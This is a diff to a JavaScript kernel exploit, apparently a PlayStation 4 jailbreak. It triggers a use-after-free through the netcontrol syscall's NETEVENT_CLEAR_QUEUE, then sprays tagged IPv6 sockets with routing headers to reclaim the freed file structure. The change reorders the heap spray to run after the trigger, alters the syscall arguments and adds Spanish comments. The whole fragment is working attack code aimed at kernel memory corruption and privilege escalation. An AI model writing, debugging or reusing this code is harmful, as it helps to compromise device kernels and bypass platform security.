@@ -503,7 +503,7 @@ const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
 
                                      function netevent(sock, event) {
                                          argDv.setUint32(0, sock >>> 0, true);
-                                         const r = sc(SYS.netcontrol, 0, event, argAddr, 4).i32;
+                                         const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
                                          return { rv: r, err: r === -1 ? errno() : 0 };
                                      }
 
@@ -560,15 +560,8 @@ const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
 
             new Uint8Array(uioIovAb).fill(0);
             put(uioIovDv, 0, dummyAddr);
-            const ipv6 = [];
-            for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
-                const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
-                if (s === -1) break;
-                ipv6.push(s);
-            }
-            check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK,
-                  ipv6.length + "/" + NUM_IPV6_SOCK);
-
+            let ipv6 = [];
+        
             function makeRpc(w, name) {
                 let seq = 0;
                 const pending = new Map();
@@ -906,12 +899,6 @@ const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
                 try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
                 catch (e) { }
 
-                // ── SPRAY — reclaim freed file struct with tagged ipv6 sockets ──
-                for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
-                    if (burned.has(ipv6[i])) continue;
-                    sprayDv.setUint32(4, tagFor(i), true);
-                    setRthdr(ipv6[i]);
-                }
                 for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);
                 sc(SYS.sched_yield);
                 sc(SYS.sched_yield);
@@ -924,21 +911,32 @@ const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
                 }
 
                 // ── TRIGGER — CLEAR dereferences the stale slot pointer ──
-                const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
+                const clr2 = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
                 mark("UAF-TRIGGER", "fd=" + uafSock
-                + " clear_rv=" + clr.rv
-                + (clr.rv === -1 ? " clear_errno=" + clr.err : ""));
+                     + " clear2_rv=" + clr2.rv
+                     + (clr2.rv === -1 ? " clear2_errno=" + clr2.err : ""));
                 rebootRequired = true;
 
+                // ── NUEVO SPRAY: Reclamar la estructura file liberada con nuevos sockets ──
+                ipv6.length = 0; // Limpiar el array global
+                for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
+                    const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
+                    if (s === -1) break;
+                    ipv6.push(s);
+                    // Etiquetar el socket recién creado
+                    sprayDv.setUint32(4, tagFor(i), true);
+                    setRthdr(s);
+                }
+                mark("SPRAY-DONE", "ipv6=" + ipv6.length + " msgs=128");
+
+                // Ahora sí, buscar los twins
                 twins = findTwins(MAX_ROUNDS_TWIN);
                 if (!twins) {
                     if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
-                    mark("ATTEMPT-RETRY", "after=no-twins next="
-                    + (attempt + 1) + "/" + NUM_ATTEMPT);
+                    mark("ATTEMPT-RETRY", "after=no-twins next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                     continue;
                 }
-                mark("TWINS", "a=" + twins.a + " b=" + twins.b
-                + " round=" + twins.round);
+                mark("TWINS", "a=" + twins.a + " b=" + twins.b + " round=" + twins.round);
 
                 freeRthdr(twins.b);
                 let reclaimed = false, rounds = 0;
